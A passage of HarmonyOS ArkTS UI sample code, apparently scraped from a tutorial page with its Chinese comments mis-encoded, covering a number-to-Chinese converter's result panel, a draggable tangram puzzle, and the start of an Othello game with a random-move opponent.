.shadow(&#123; // æ·»åŠ é˜´å½±æ•ˆæœ radius: 10, // é˜´å½±åŠå¾„ color: this.lineColor, // é˜´å½±é¢œè‰² offsetX: 0, // Xè½´åç§»é‡ offsetY: 0 // Yè½´åç§»é‡ &#125;); // ç»“æœåŒº Column() &#123; Row() &#123; Text(`å°å†™ï¼š$&#123;this.chineseLowercase&#125;`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // æ˜¾ç¤ºå°å†™ç»“æœ Text(&#x27;å¤åˆ¶&#x27;) .fontColor(Color.White) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .padding(`$&#123;this.basePadding / 2&#125;lpx`) // è®¾ç½®å†…è¾¹è· .backgroundColor(&quot;#0052d9&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // è®¾ç½®ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.copyToClipboard(this.chineseLowercase); // å¤åˆ¶å°å†™ç»“æœåˆ°å‰ªè´´æ¿ &#125;); &#125;.constraintSize(&#123; minHeight: 45 &#125;) // æœ€å°é«˜åº¦ .justifyContent(FlexAlign.SpaceBetween) // å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼ .width(&#x27;100%&#x27;); // è®¾ç½®å®½åº¦ Divider().margin(&#123; top: 5, bottom: 5 &#125;); // åˆ†å‰²çº¿ Row() &#123; Text(`å¤§å†™ï¼š$&#123;this.chineseUppercase&#125;`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // æ˜¾ç¤ºå¤§å†™ç»“æœ Text(&#x27;å¤åˆ¶&#x27;) .fontColor(Color.White) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .padding(`$&#123;this.basePadding / 2&#125;lpx`) // è®¾ç½®å†…è¾¹è· .backgroundColor(&quot;#0052d9&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // è®¾ç½®ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.copyToClipboard(this.chineseUppercase); // å¤åˆ¶å¤§å†™ç»“æœåˆ°å‰ªè´´æ¿ &#125;); &#125;.constraintSize(&#123; minHeight: 45 &#125;) // æœ€å°é«˜åº¦ .justifyContent(FlexAlign.SpaceBetween) // å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼ .width(&#x27;100%&#x27;); // è®¾ç½®å®½åº¦ Divider().margin(&#123; top: 5, bottom: 5 &#125;); // åˆ†å‰²çº¿ Row() &#123; Text(`å¤§å†™é‡‘é¢ï¼š$&#123;this.chineseUppercaseAmount&#125;`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // æ˜¾ç¤ºå¤§å†™é‡‘é¢ç»“æœ Text(&#x27;å¤åˆ¶&#x27;) .fontColor(Color.White) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .padding(`$&#123;this.basePadding / 2&#125;lpx`) // è®¾ç½®å†…è¾¹è· .backgroundColor(&quot;#0052d9&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // è®¾ç½®ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.copyToClipboard(this.chineseUppercaseAmount); // å¤åˆ¶å¤§å†™é‡‘é¢ç»“æœåˆ°å‰ªè´´æ¿ &#125;); &#125;.constraintSize(&#123; minHeight: 45 &#125;) // æœ€å°é«˜åº¦ .justifyContent(FlexAlign.SpaceBetween) // å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼ .width(&#x27;100%&#x27;); // è®¾ç½®å®½åº¦ &#125; .alignItems(HorizontalAlign.Start) // å¯¹é½æ–¹å¼ .width(&#x27;650lpx&#x27;) // è®¾ç½®å®½åº¦ .padding(`$&#123;this.basePadding&#125;lpx`) // è®¾ç½®å†…è¾¹è· .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // è®¾ç½®å¤–è¾¹è· .borderRadius(10) // è®¾ç½®åœ†è§’ .backgroundColor(Color.White) // è®¾ç½®èƒŒæ™¯é¢œè‰² .shadow(&#123; // æ·»åŠ é˜´å½±æ•ˆæœ radius: 10, // é˜´å½±åŠå¾„ color: this.lineColor, // é˜´å½±é¢œè‰² offsetX: 0, // Xè½´åç§»é‡ offsetY: 0 // Yè½´åç§»é‡ &#125;); &#125; &#125;.scrollBar(BarState.Off).clip(false); // å…³é—­æ»šåŠ¨æ¡ï¼Œä¸å…è®¸è£å‰ª &#125; .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ .backgroundColor(&quot;#f4f8fb&quot;); // è®¾ç½®é¡µé¢èƒŒæ™¯é¢œè‰² &#125;&#125; Tangramä¸ƒå·§æ¿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201@ObservedV2 // ç›‘å¬æ•°æ®å˜åŒ–çš„è£…é¥°å™¨class TangramBlock &#123; // å®šä¹‰ä¸ƒå·§æ¿ç±» width: number; // å®½åº¦ height: number; // é«˜åº¦ points: Array&lt;[number, number]&gt;; // ç‚¹åæ ‡æ•°ç»„ color: string; // é¢œè‰² @Trace initialOffsetX: number; // åˆå§‹Xåç§»é‡ @Trace initialOffsetY: number; // åˆå§‹Yåç§»é‡ @Trace currentOffsetX: number; // å½“å‰Xåç§»é‡ @Trace currentOffsetY: number; // å½“å‰Yåç§»é‡ @Trace rotationAngle: number; // æ—‹è½¬è§’åº¦ @Trace flipAngle: number = 0; // ç¿»è½¬è§’åº¦ï¼Œé»˜è®¤ä¸º0 @Trace rotateValue: number; // æ—‹è½¬å€¼ defaultInitialOffsetX: number; // é»˜è®¤åˆå§‹Xåç§»é‡ defaultInitialOffsetY: number; // é»˜è®¤åˆå§‹Yåç§»é‡ defaultRotationAngle: number; // é»˜è®¤æ—‹è½¬è§’åº¦ constructor(color: string, width: number, height: number, initialOffsetX: number, initialOffsetY: number, rotationAngle: number, points: Array&lt;[number, number]&gt;) &#123; this.initialOffsetX = this.currentOffsetX = this.defaultInitialOffsetX = initialOffsetX; // åˆå§‹åŒ–Xåç§»é‡ this.initialOffsetY = this.currentOffsetY = this.defaultInitialOffsetY = initialOffsetY; // åˆå§‹åŒ–Yåç§»é‡ this.rotationAngle = this.rotateValue = this.defaultRotationAngle = rotationAngle; // åˆå§‹åŒ–æ—‹è½¬è§’åº¦ this.color = color; // è®¾ç½®é¢œè‰² this.width = width; // è®¾ç½®å®½åº¦ this.height = height; // è®¾ç½®é«˜åº¦ this.points = points; // è®¾ç½®ç‚¹åæ ‡æ•°ç»„ &#125; resetData() &#123; // é‡ç½®æ•°æ®æ–¹æ³• this.flipAngle = 0; // é‡ç½®ç¿»è½¬è§’åº¦ this.initialOffsetX = this.currentOffsetX = this.defaultInitialOffsetX; // é‡ç½®åˆå§‹Xåç§»é‡ this.initialOffsetY = this.currentOffsetY = this.defaultInitialOffsetY; // é‡ç½®åˆå§‹Yåç§»é‡ this.rotationAngle = this.rotateValue = this.defaultRotationAngle; // é‡ç½®æ—‹è½¬è§’åº¦ &#125;&#125; const baseUnitLength: number = 80; // åŸºæœ¬å•ä½é•¿åº¦ @Entry // å…¥å£ç»„ä»¶@Component // å®šä¹‰ç»„ä»¶export struct Index &#123; // ä¸»ç»„ä»¶ @State selectedBlockIndex: number = -1; // å½“å‰é€‰ä¸­ä½ç½® @State blocks: TangramBlock[] = [// ä¸ƒå·§æ¿æ•°ç»„ // å°ç›´è§’ç­‰è…°ä¸‰è§’å½¢ new TangramBlock(&quot;#fed8e5&quot;, baseUnitLength, baseUnitLength, -33.58, -58.02, 135, [[0, 0], [baseUnitLength, 0], [0, baseUnitLength]]), new TangramBlock(&quot;#0a0bef&quot;, baseUnitLength, baseUnitLength, 78.76, 54.15, 45, [[0, 0], [baseUnitLength, 0], [0, baseUnitLength]]), // ä¸­ç›´è§’ç­‰è…°ä¸‰è§’å½¢ new TangramBlock(&quot;#ff0d0c&quot;, baseUnitLength * Math.sqrt(2), baseUnitLength * Math.sqrt(2), -33.16, -1.43, -90, [[0, 0], [baseUnitLength * Math.sqrt(2), 0], [0, baseUnitLength * Math.sqrt(2)]]), // å¤§ç›´è§’ç­‰è…°ä¸‰è§’å½¢ new TangramBlock(&quot;#ffa60a&quot;, baseUnitLength * 2, baseUnitLength * 2, 22.46, -172, -135, [[0, 0], [baseUnitLength * 2, 0], [0, baseUnitLength * 2]]), new TangramBlock(&quot;#3da56a&quot;, baseUnitLength * 2, baseUnitLength * 2, 135.65, -59.34, -45, [[0, 0], [baseUnitLength * 2, 0], [0, baseUnitLength * 2]]), // æ­£æ–¹å½¢ new TangramBlock(&quot;#ffff0b&quot;, baseUnitLength, baseUnitLength, 23.07, -1.84, -45, [[0, 0], [baseUnitLength, 0], [baseUnitLength, baseUnitLength], [0, baseUnitLength]]), // å¹³è¡Œå››è¾¹å½¢ new TangramBlock(&quot;#5e0b9b&quot;, baseUnitLength * 2, baseUnitLength, -61.53, -85.97, 45, [[0, 0], [baseUnitLength, 0], [baseUnitLength * 2, baseUnitLength], [baseUnitLength, baseUnitLength]]) ]; build() &#123; // æ„å»ºæ–¹æ³• Column(&#123; space: 30 &#125;) &#123; // åˆ›å»ºå‚ç›´å¸ƒå±€ Stack() &#123; // åˆ›å»ºå †å å¸ƒå±€ ForEach(this.blocks, (block: TangramBlock, index: number) =&gt; &#123; // éå†ä¸ƒå·§æ¿æ•°ç»„ Stack() &#123; // åˆ›å»ºå †å å¸ƒå±€ Polygon(&#123; width: block.width, height: block.height &#125;)// ç»˜åˆ¶å¤šè¾¹å½¢ .points(block.points)// è®¾ç½®å¤šè¾¹å½¢é¡¶ç‚¹åæ ‡ .fill(block.color)// å¡«å……é¢œè‰² .draggable(false)// é•¿æŒ‰ä¸å¯æ‹–åŠ¨ .rotate(&#123; angle: block.rotationAngle &#125;) // æ—‹è½¬è§’åº¦ &#125; .rotate(&#123; // æ—‹è½¬ x: 0, y: 1, z: 0, angle: block.flipAngle, centerX: block.width / 2, // ä¸­å¿ƒç‚¹Xåæ ‡ centerY: block.height / 2, // ä¸­å¿ƒç‚¹Yåæ ‡ &#125;) .width(block.width) // è®¾ç½®å®½åº¦ .height(block.height) // è®¾ç½®é«˜åº¦ .onTouch(() =&gt; &#123; // è§¦æ‘¸äº‹ä»¶ this.selectedBlockIndex = index; // è®¾ç½®é€‰ä¸­ç´¢å¼• &#125;) .draggable(false) // é•¿æŒ‰ä¸å¯æ‹–åŠ¨ .translate(&#123; x: block.initialOffsetX, y: block.initialOffsetY, z: 0 &#125;) // å¹³ç§» .gesture( // æ‰‹åŠ¿æ“ä½œ PanGesture()// æ‹–åŠ¨æ‰‹åŠ¿ .onActionUpdate((event: GestureEvent | undefined) =&gt; &#123; // æ›´æ–°äº‹ä»¶ if (event) &#123; block.initialOffsetX = block.currentOffsetX + event.offsetX; // æ›´æ–°Xåç§»é‡ block.initialOffsetY = block.currentOffsetY + event.offsetY; // æ›´æ–°Yåç§»é‡ &#125; &#125;) .onActionEnd((event: GestureEvent | undefined) =&gt; &#123; // ç»“æŸäº‹ä»¶ if (event) &#123; block.currentOffsetX = block.initialOffsetX; // æ›´æ–°å½“å‰Xåç§»é‡ block.currentOffsetY = block.initialOffsetY; // æ›´æ–°å½“å‰Yåç§»é‡ &#125; &#125;) ) .zIndex(this.selectedBlockIndex == index ? 1 : 0) // è®¾ç½®å±‚çº§ .borderWidth(2) // è¾¹æ¡†å®½åº¦ .borderStyle(BorderStyle.Dashed) // è¾¹æ¡†æ ·å¼ .borderColor(this.selectedBlockIndex == index ? &quot;#80a8a8a8&quot; : Color.Transparent) // è¾¹æ¡†é¢œè‰² &#125;) &#125;.width(&#x27;100%&#x27;).height(&#x27;750lpx&#x27;) // è®¾ç½®å®½é«˜ .backgroundColor(&quot;#e4f2f5&quot;) // èƒŒæ™¯é¢œè‰² // æ—‹è½¬è§’åº¦è®¡æ•°å™¨ Column(&#123; space: 5 &#125;) &#123; // åˆ›å»ºå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`æ—‹è½¬è§’åº¦(é—´éš”5)`).fontColor(Color.Black) // æ˜¾ç¤ºæ—‹è½¬è§’åº¦æ–‡æœ¬ï¼Œè®¾ç½®å­—ä½“é¢œè‰² Counter() &#123; // åˆ›å»ºè®¡æ•°å™¨ç»„ä»¶ Text(`$&#123;this.selectedBlockIndex != -1 ? this.blocks[this.selectedBlockIndex].rotationAngle : &#x27;-&#x27;&#125;`)// æ˜¾ç¤ºå½“å‰é€‰ä¸­ä¸ƒå·§æ¿çš„æ—‹è½¬è§’åº¦æˆ–å ä½ç¬¦ .fontColor(Color.Black) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle += 5; // å¢åŠ æ—‹è½¬è§’åº¦ &#125;) &#125; &#125;).onDec(() =&gt; &#123; // å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle -= 5; // å‡å°‘æ—‹è½¬è§’åº¦ &#125;) &#125; &#125;); &#125; // æ—‹è½¬è§’åº¦è®¡æ•°å™¨ Column(&#123; space: 5 &#125;) &#123; // åˆ›å»ºå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`æ—‹è½¬è§’åº¦(é—´éš”45)`).fontColor(Color.Black) // æ˜¾ç¤ºæ—‹è½¬è§’åº¦æ–‡æœ¬ï¼Œè®¾ç½®å­—ä½“é¢œè‰² Counter() &#123; // åˆ›å»ºè®¡æ•°å™¨ç»„ä»¶ Text(`$&#123;this.selectedBlockIndex != -1 ? this.blocks[this.selectedBlockIndex].rotationAngle : &#x27;-&#x27;&#125;`)// æ˜¾ç¤ºå½“å‰é€‰ä¸­ä¸ƒå·§æ¿çš„æ—‹è½¬è§’åº¦æˆ–å ä½ç¬¦ .fontColor(Color.Black) // è®¾ç½®å­—ä½“é¢œè‰² &#125; .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle += 45; // å¢åŠ æ—‹è½¬è§’åº¦ &#125;) &#125; &#125;).onDec(() =&gt; &#123; // å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle -= 45; // å‡å°‘æ—‹è½¬è§’åº¦ &#125;) &#125; &#125;); &#125; // ç¿»è½¬æŒ‰é’® Row() &#123; // åˆ›å»ºæ°´å¹³å¸ƒå±€ Button(&#x27;å‘å·¦ç¿»è½¬&#x27;).onClick(() =&gt; &#123; // å·¦ç¿»è½¬æŒ‰é’®ç‚¹å‡»äº‹ä»¶ animateTo(&#123;&#125;, () =&gt; &#123; if (this.selectedBlockIndex != -1) &#123; this.blocks[this.selectedBlockIndex].flipAngle -= 180; // å‡å°‘ç¿»è½¬è§’åº¦ &#125; &#125;); &#125;); Button(&#x27;å‘å³ç¿»è½¬&#x27;).onClick(() =&gt; &#123; // å³ç¿»è½¬æŒ‰é’®ç‚¹å‡»äº‹ä»¶ animateTo(&#123;&#125;, () =&gt; &#123; if (this.selectedBlockIndex != -1) &#123; this.blocks[this.selectedBlockIndex].flipAngle += 180; // å¢åŠ ç¿»è½¬è§’åº¦ &#125; &#125;); &#125;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceEvenly) // è®¾ç½®å®½åº¦å’Œå†…å®¹å¯¹é½æ–¹å¼ // é‡ç½®å’Œéšè—è¾¹æ¡†æŒ‰é’® Row() &#123; // åˆ›å»ºæ°´å¹³å¸ƒå±€ Button(&#x27;é‡ç½®&#x27;).onClick(() =&gt; &#123; // é‡ç½®æŒ‰é’®ç‚¹å‡»äº‹ä»¶ animateTo(&#123;&#125;, () =&gt; &#123; for (let i = 0; i &lt; this.blocks.length; i++) &#123; this.blocks[i].resetData(); // é‡ç½®ä¸ƒå·§æ¿æ•°æ® &#125; this.selectedBlockIndex = -1; // é‡ç½®é€‰ä¸­ç´¢å¼• &#125;); &#125;); Button(&#x27;éšè—è¾¹æ¡†&#x27;).onClick(() =&gt; &#123; // éšè—è¾¹æ¡†æŒ‰é’®ç‚¹å‡»äº‹ä»¶ this.selectedBlockIndex = -1; // é‡ç½®é€‰ä¸­ç´¢å¼• &#125;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceEvenly) // è®¾ç½®å®½åº¦å’Œå†…å®¹å¯¹é½ &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;) &#125;&#125; Reversiç¿»è½¬æ£‹ï¼ˆReversiï¼‰ã€å¥¥èµ›ç½—æ£‹ï¼ˆOthelloï¼‰ã€è‹¹æœæ£‹æˆ–æ­£åæ£‹ï¼ˆAnti reversiï¼‰ é»‘ç™½æ£‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // å¯¼å…¥ç”¨äºå¼¹å‡ºå¯¹è¯æ¡†çš„å·¥å…· @ObservedV2class ChessCell &#123; // å®šä¹‰æ£‹ç›˜ä¸Šçš„å•å…ƒæ ¼ç±» @Trace frontVisibility: number = 0; // å•å…ƒæ ¼ä¸Šçš„æ£‹å­çŠ¶æ€ï¼š0è¡¨ç¤ºæ— å­, 1è¡¨ç¤ºé»‘å­ï¼Œ2è¡¨ç¤ºç™½å­ @Trace rotationAngle: number = 0; // å•å…ƒæ ¼å¡ç‰‡çš„æ—‹è½¬è§’åº¦ @Trace opacity: number = 1; // é€æ˜åº¦ isAnimationRunning: boolean = false; // æ ‡è®°åŠ¨ç”»æ˜¯å¦æ­£åœ¨è¿è¡Œ flip(time: number) &#123; // ç¿»è½¬æ£‹å­çš„æ–¹æ³• if (this.frontVisibility === 1) &#123; // å½“å‰æ˜¯é»‘å­ï¼Œè¦ç¿»è½¬æˆç™½å­ this.showWhite(time); &#125; else if (this.frontVisibility === 2) &#123; // å½“å‰æ˜¯ç™½å­ï¼Œè¦ç¿»è½¬æˆé»‘å­ this.showBlack(time); &#125; &#125; showBlack(animationTime: number, callback?: () =&gt; void) &#123; // å±•ç¤ºé»‘è‰²æ£‹å­ if (this.isAnimationRunning) &#123; // å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å› return; &#125; this.isAnimationRunning = true; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­ if (animationTime == 0) &#123; // å¦‚æœä¸éœ€è¦åŠ¨ç”» this.rotationAngle = 0; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º0 this.frontVisibility = 1; // é»‘å­ this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; animateToImmediately(&#123; // å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ animateToImmediately(&#123; // å†æ¬¡å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.frontVisibility = 1; // çœ‹åˆ°é»‘è‰² this.rotationAngle = 0; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º0 &#125;); &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.rotationAngle = 90; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦ &#125;); &#125; showWhite(animationTime: number, callback?: () =&gt; void) &#123; // å±•ç¤ºç™½è‰²æ£‹å­ if (this.isAnimationRunning) &#123; // å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å› return; &#125; this.isAnimationRunning = true; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­ if (animationTime == 0) &#123; // å¦‚æœä¸éœ€è¦åŠ¨ç”» this.rotationAngle = 180; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦ this.frontVisibility = 2; // ç™½å­ this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; animateToImmediately(&#123; // å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ animateToImmediately(&#123; // å†æ¬¡å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.frontVisibility = 2; // çœ‹åˆ°ç™½è‰² this.rotationAngle = 180; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦ &#125;); &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.rotationAngle = 90; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦ &#125;); &#125; showWhiteAi(animationTime: number, callback?: () =&gt; void) &#123; // å±•ç¤ºç™½è‰²æ£‹å­ if (this.isAnimationRunning) &#123; // å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å› return; &#125; this.isAnimationRunning = true; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­ if (animationTime == 0) &#123; // å¦‚æœä¸éœ€è¦åŠ¨ç”» this.rotationAngle = 180; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦ this.frontVisibility = 2; // ç™½å­ this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; this.rotationAngle = 180; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦ this.frontVisibility = 2; // ç™½å­ animateToImmediately(&#123; // å¼€å§‹åŠ¨ç”» duration: animationTime * 3, // åŠ¨ç”»æŒç»­æ—¶é—´ curve: Curve.EaseOut, iterations: 3, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ animateToImmediately(&#123; // å†æ¬¡å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; &#125;, () =&gt; &#123; this.opacity = 1; &#125;); &#125; &#125;, () =&gt; &#123; this.opacity = 0.2; &#125;); &#125;&#125; @ObservedV2class TileHighlight &#123; @Trace isValidMove: boolean = false;&#125; @Entry@Componentstruct OthelloGame &#123; @State chessBoard: ChessCell[][] = []; @State cellSize: number = 70; @State cellSpacing: number = 5; @State transitionDuration: number = 200; @State @Watch(&#x27;currentPlayerIsBlackChanged&#x27;) currentPlayerIsBlack: boolean = true; // å…ˆæ‰‹ï¼Œtrueè¡¨ç¤ºé»‘æ£‹ @State chessBoardSize: number = 8; // å‡è®¾æ£‹ç›˜å¤§å°ä¸º8Ã—8 @State validMoveIndicators: TileHighlight [][] = [] @State isTwoPlayerMode: boolean = false; //true:åŒå‡»æ¸¸æˆï¼Œfalse:å•äººæ¸¸æˆ @State isAIPlaying:boolean = false//true:AIæ­£åœ¨ä¸‹æ£‹ currentPlayerIsBlackChanged() &#123; setTimeout(() =&gt; &#123; const color = this.currentPlayerIsBlack ? 1 : 2; // 1æ˜¯é»‘å­ï¼Œ2è¡¨ç¤ºç™½å­ let hasMoves = this.hasValidMoves(color); if (!hasMoves) &#123; let opponentHasMoves = this.hasValidMoves(!this.currentPlayerIsBlack ? 1 : 2); if (!opponentHasMoves) &#123; const winner = this.determineWinner(); console.log(winner); promptAction.showDialog(&#123; title: &#x27;æ¸¸æˆç»“æŸ&#x27;, message: `$&#123;winner&#125;`, buttons: [&#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.initGame(); &#125;); &#125; else &#123; this.currentPlayerIsBlack = !this.currentPlayerIsBlack; // åˆ‡æ¢ä¸‹ä¸€ç©å®¶ &#125; &#125; else &#123; if (!this.currentPlayerIsBlack) &#123; // å½“å‰æ˜¯ç™½æ£‹, æ¨¡æ‹ŸAIä¸‹æ£‹ if (!this.isTwoPlayerMode) &#123; setTimeout(() =&gt; &#123; this.aiPlaceRandom(); &#125;, this.transitionDuration + 20); &#125; &#125; &#125; &#125;, this.transitionDuration + 20); &#125; aiPlaceRandom() &#123; let validMoves: [number, number][] = []; for (let i = 0; i &lt; this.validMoveIndicators.length; i++) &#123; for (let j = 0; j &lt; this.validMoveIndicators[i].length; j++) &#123; if (this.validMoveIndicators[i][j].isValidMove) &#123; validMoves.push([i, j]); &#125; &#125; &#125; if (validMoves.length &gt; 0) &#123; const randomMove = validMoves[Math.floor(Math.random() * validMoves.length)]; let chessCell = this.chessBoard[randomMove[0]][randomMove[1]]; this.placeChessPiece(randomMove[0], randomMove[1], chessCell) &#125; &#125; placeChessPiece(i: number, j: number, chessCell: ChessCell) &#123; let 